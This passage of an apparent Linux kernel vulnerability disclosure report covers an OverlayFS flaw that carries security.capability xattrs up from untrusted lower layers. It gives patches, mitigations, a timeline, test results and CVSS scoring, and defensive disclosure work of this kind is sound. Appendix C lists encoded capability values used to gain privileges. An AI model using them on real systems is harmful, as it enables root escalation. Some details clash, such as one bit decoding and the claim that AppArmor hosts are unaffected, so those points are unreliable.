
### 13.2 Proposed Safe Implementation (Option A — Recommended)

Add an explicit check for `security.capability` in `ovl_copy_xattr()` when the lower layer is not explicitly trusted. The fix does not alter behavior for trusted lower layers (e.g., administrator-managed overlayfs with known-good lower content); it only prevents propagation when the lower layer's capability grants cannot be verified as authorized:

```c
/* Proposed fix in fs/overlayfs/copy_up.c */

/* New helper: determine if lower layer should be trusted for capability xattrs */
static bool ovl_lower_is_trusted(struct ovl_fs *ofs)
{
    /*
     * Trust the lower layer for capability xattrs only if:
     * 1. The 'trusted_lower' mount option is explicitly set (to be added), OR
     * 2. The lower layer is a known-trusted filesystem type
     *
     * By default (no option set), the lower layer is NOT trusted for capability xattrs.
     */
    return ofs->config.trusted_lower;
}

/* Modified ovl_copy_xattr() — add before ovl_do_setxattr() call */
static int ovl_copy_xattr(struct super_block *sb,
                           const struct path *oldpath,
                           struct dentry *new)
{
    /* ... existing enumeration code ... */

    for (p = buf; ...) {
        /* [EXISTING] LSM hook */
        error = security_inode_copy_up_xattr(old, p);
        if (error == -ECANCELED) {
            error = 0;
            continue;
        }

        /* [NEW FIX] Explicit capability xattr guard */
        if (!strcmp(p, XATTR_NAME_CAPS) && !ovl_lower_is_trusted(OVL_FS(sb))) {
            /*
             * Refuse to propagate security.capability from an untrusted
             * lower layer. Without an active LSM, this is the only
             * kernel-level guard against capability laundering through
             * the overlay copy-up path.
             *
             * See: VULN-001 — OverlayFS capability xattr preservation.
             */
            if (ovl_must_copy_xattr(p)) {
                /*
                 * security.capability is classified as mandatory by
                 * ovl_must_copy_xattr(). We override this for the
                 * untrusted-lower case to prevent privilege escalation.
                 */
                error = 0;
            }
            continue;
        }

        err2 = ovl_do_setxattr(ofs, new, p, val, slen, 0);
        /* ... */
    }
}
```

### 13.3 Proposed Safe Implementation (Option B — Defense-in-Depth)

Without introducing a new mount option, a conservative fix skips `security.capability` propagation unless the LSM explicitly approves it (i.e., requires an active LSM for capability xattr propagation):

```c
/* In ovl_copy_xattr(), replace the current LSM hook handling: */

error = security_inode_copy_up_xattr(old, p);
if (error == -ECANCELED) {
    error = 0;
    continue;
}
/*
 * For security.capability: require explicit LSM acceptance.
 * -EOPNOTSUPP means "no LSM opinion" — treat this conservatively
 * as "deny" for the capability xattr to prevent privilege laundering.
 */
if (!strcmp(p, XATTR_NAME_CAPS) && error == -EOPNOTSUPP) {
    /*
     * No LSM is active to validate this capability grant.
     * Skip propagation of security.capability from lower layer.
     * This prevents unprivileged capability escalation via
     * attacker-controlled overlay lower layers.
     */
    error = 0;
    continue;
}
```

### 13.4 Mount Option Approach (Option C — Most Backward Compatible)

Introduce a new overlayfs mount option `capable_lower` (default: off) that explicitly opts-in to capability xattr propagation from the lower layer, requiring the mount creator to consciously assert that the lower layer is trusted:

```
# Trusted (admin-controlled) lower layer: capabilities propagated
mount -t overlay overlay \
    -o lowerdir=/trusted/lower,...,capable_lower \
    /merged

# Default (untrusted lower): capabilities NOT propagated
mount -t overlay overlay \
    -o lowerdir=/untrusted/lower,... \
    /merged
```

---

## 14. Remediation Recommendations

### 14.1 Immediate Kernel Patch (Preferred)

Apply Option B (Section 13.3) as an immediate security fix. This change has the smallest behavioral footprint: it only affects the case where no LSM is active and `security.capability` is present on the lower-layer file. All existing deployments with SELinux or AppArmor active are unaffected. The fix does not break any existing use case because:

1. Legitimate capability-bearing binaries on the upper layer are unaffected (capabilities are only skipped from lower-to-upper propagation, not from upper-layer files already set by authorized means)
2. Deployments with LSM active already receive this protection via the LSM hook
3. Deployments requiring lower-layer capability propagation may enable it explicitly via Option A/C

### 14.2 Immediate Operational Mitigations

1. **Enable SELinux or AppArmor with overlayfs-aware policy.** The LSM hook `security_inode_copy_up_xattr()` is the kernel's designed mitigation point; use it.

2. **Mount lower layers with `nosuid` flag where possible.** While `nosuid` does not directly block capability xattr propagation, it prevents setuid binary execution from the lower layer.

3. **Use `userxattr` mount option** for overlayfs deployments where the lower layer is user-controlled. This namespaces xattrs under `user.` prefix, preventing `security.capability` from being interpreted by the kernel capability subsystem.

4. **For LXC/systemd-nspawn deployments:** Audit container images for `security.capability` xattrs before deployment using:
   ```bash
   find /path/to/rootfs -exec getfattr -n security.capability {} \; 2>/dev/null | grep -v "^$"
   ```

5. **Add `--security-opt no-new-privileges` to container run commands.** This sets `PR_SET_NO_NEW_PRIVS` on the container's init process, preventing file capability grants on execve.

### 14.3 Container Runtime Guidance

Container runtime authors should consider implementing capability xattr stripping as a defense-in-depth measure, analogous to Docker BuildKit's implementation. Specifically:

- During container image import or rootfs extraction, strip `security.capability` xattrs from all files unless the operator explicitly opts in to capability propagation
- Document the security implications of capability xattr propagation in deployment guides
- Implement a capability xattr audit step in container image vulnerability scanning pipelines

---

## 15. Vulnerability Discovery Timeline

| Date | Event |
|---|---|
| 2026-09-16 | Vulnerability identified during automated kernel source audit using two-stage program slicing methodology |
| 2026-09-16 | Static source analysis confirmed: `ovl_must_copy_xattr()`, `security_inode_copy_up_xattr()` no-op, metacopy save/restore |
| 2026-09-17 | Dynamic PoC confirmed on Linux 7.2.6 (QEMU VM, `security=none`): UID=1001 read `/etc/shadow` |
| 2026-09-17 | Extended PoC confirmed full UID=0 escalation on Linux 7.2.6 via `/etc/passwd` injection |
| 2026-09-17 | Dynamic PoC confirmed on Ubuntu 24.04 LTS (Linux 7.0.0-31-generic, AppArmor enforce): UID=1002 read `/etc/shadow` |
| 2026-09-17 | systemd-nspawn Scenarios A and B confirmed: UID=1337 root shell |
| 2026-09-17 | LXC 5.0.3 with overlay rootfs confirmed: UID=1337 root shell |
| 2026-09-17 | Docker 29.8.1 tested: BuildKit layer export strips capability — supply chain path mitigated at application layer |
| 2026-09-17 | OverlayFS upper layer raw xattr confirmed persistent via `getfattr`, `/proc/$PID/mountinfo` |
| 2026-09-18 | Coordinated disclosure report submitted |
| T+7 days | Requested: Vendor acknowledgment |
| T+30 days | Requested: CVE assignment |
| T+60 days | Requested: Patch development complete |
| T+90 days | Public disclosure (or upon patch release, whichever is earlier) |

---

## 16. References

### 16.1 Related CVEs

- **CVE-2021-3847**: OverlayFS setuid/setgid file privilege escalation — preceding vulnerability in the same subsystem demonstrating the historical attack surface
- **CVE-2023-0386**: OverlayFS copy-up with crafted xattrs in user namespaces — the fix for which (commit `4f11ada10d0a`) is present in Linux 7.2 but does not address VULN-001

### 16.2 Kernel Source Files

| File | Relevance |
|---|---|
| `fs/overlayfs/copy_up.c` | Primary vulnerable code: `ovl_must_copy_xattr()` (L39), `ovl_copy_xattr()` (L86), `ovl_copy_up_meta_inode_data()` (L1082) |
| `fs/overlayfs/xattrs.c` | OverlayFS xattr handlers: `ovl_xattr_set()`, `ovl_xattr_get()` |
| `fs/overlayfs/util.c` | Credential override: `ovl_override_creds()` |
| `fs/overlayfs/dir.c` | Directory operations, mount creator credential storage |
| `security/commoncap.c` | `cap_convert_nscap()` (L569): capability xattr validation |
| `include/linux/security.h` | `security_inode_copy_up_xattr()` (L1130): no-op stub |

### 16.3 Standards and Specifications

- POSIX.1e Draft 17: File Capabilities specification
- Linux Kernel Documentation: `Documentation/filesystems/overlayfs.rst`
- Linux Capabilities man page: `capabilities(7)`
- CVSS 3.1 Specification Document: FIRST.org

---

## 17. Appendices

### Appendix A: Complete OverlayFS Copy-Up Call Graph

```
execve(merged/binary)
  └── ovl_copy_up()  [copy_up.c]
       └── ovl_copy_up_one()  [copy_up.c:1131]
            └── ovl_copy_up_workdir()  [copy_up.c:758]
                 ├── with_ovl_creds() → ovl_override_creds() [util.c:65]
                 │    → All subsequent operations use mount-creator credentials
                 ├── ovl_create_temp() [dir.c]
                 ├── ovl_copy_up_data() [copy_up.c]
                 ├── ovl_copy_up_metadata() [copy_up.c:666]
                 │    └── ovl_copy_xattr() [copy_up.c:86]
                 │         ├── vfs_listxattr() — enumerate lower-layer xattrs
                 │         ├── [for each xattr name:]
                 │         │    ├── security_inode_copy_up_xattr()
                 │         │    │    → returns -EOPNOTSUPP (no-op without LSM)
                 │         │    │    → returns -ECANCELED (SELinux/AppArmor: skip)
                 │         │    ├── ovl_must_copy_xattr()
                 │         │    │    → returns true for "security.*" prefix
                 │         │    └── ovl_do_setxattr() → vfs_setxattr()
                 │         │         └── cap_convert_nscap()
                 │         │              → validates format ✓
                 │         │              → validates CAP_SETFCAP ✓ (mount creator has it)
                 │         │              → validates rootid maps ✓
                 │         │              → DOES NOT validate legitimacy ✗
                 │         └── [Result: security.capability on upper-layer file]
                 └── ovl_set_attr() — timestamps, permissions
```

### Appendix B: Test Environment Summary

| Environment | Kernel | LSM | Outcome |
|---|---|---|---|
| QEMU VM (Debian 12) | 7.2.6 | none (`security=none`) | UID=1001 → `/etc/shadow` + `UID=0` |
| Ubuntu 24.04 LTS host | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | UID=1002 → `/etc/shadow` + `UID=0` |
| systemd-nspawn (direct) | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | UID=1337 → `/etc/shadow` + `UID=0` |
| systemd-nspawn (`--volatile=overlay`) | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | UID=1337 → `/etc/shadow` + `UID=0` |
| LXC 5.0.3 (overlay rootfs) | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | UID=1337 → `/etc/shadow` + `UID=0` |
| Docker 29.8.1 (`containerd` snapshotter) | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | Mitigated (BuildKit strips xattr) |
| Docker 29.8.1 (`overlay2` storage driver) | 7.0.0-31-generic | AppArmor (`docker-default` enforce) | Mitigated (BuildKit strips xattr) |

### Appendix C: Raw xattr Binary Encoding

The `security.capability` xattr encoding `0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=` is a base64-encoded VFS capability structure. Decoded:

| Offset | Size | Field | Value | Meaning |
|---|---|---|---|---|
| 0 | 4 | `magic_etc` | `0x02000001` | XATTR_CAPS_REVISION_2, effective flag set |
| 4 | 4 | `permitted[0]` | `0x00000082` | CAP_DAC_OVERRIDE (bit 1) + CAP_SETUID (bit 7) |
| 8 | 4 | `permitted[1]` | `0x00000000` | No high capabilities |
| 12 | 4 | `inheritable[0]` | `0x00000000` | |
| 16 | 4 | `inheritable[1]` | `0x00000000` | |

For the extended capability set used in the QEMU environment (`cap_dac_override,cap_dac_read_search,cap_sys_admin`), the encoding is `0sAQAAAgYAIAAAAAAAAAAAAAAAAA==`:

| Field | Value | Capabilities Granted |
|---|---|---|
| `permitted[0]` | `0x00000206` | CAP_DAC_OVERRIDE (bit 1) + CAP_DAC_READ_SEARCH (bit 2) + CAP_SYS_ADMIN (bit 21, low word) |
| Effective flag | Set | All permitted capabilities are immediately effective |

### Appendix D: CVSS Score Comparison Table

| Scoring Scenario | CVSS Vector | Score |
|---|---|---|
| Local LPE, direct overlayfs | `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | **8.8 High** |
| Supply chain via container registry (PR:N) | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` | **9.1 Critical** |
| Conservative (PR:H for runtime setup) | `AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` | **8.2 High** |

The primary score of 8.8 applies to the demonstrated attack vector where the attacker has low-privilege access to a system that uses overlayfs with attacker-influenced lower content (container membership, shared deployment environment).

---

*This report was prepared by Ömer Can VURAL (patchmeifucan) for coordinated vulnerability disclosure. All testing was performed on researcher-owned systems. Contact: can.omer.5306@outlook.com*
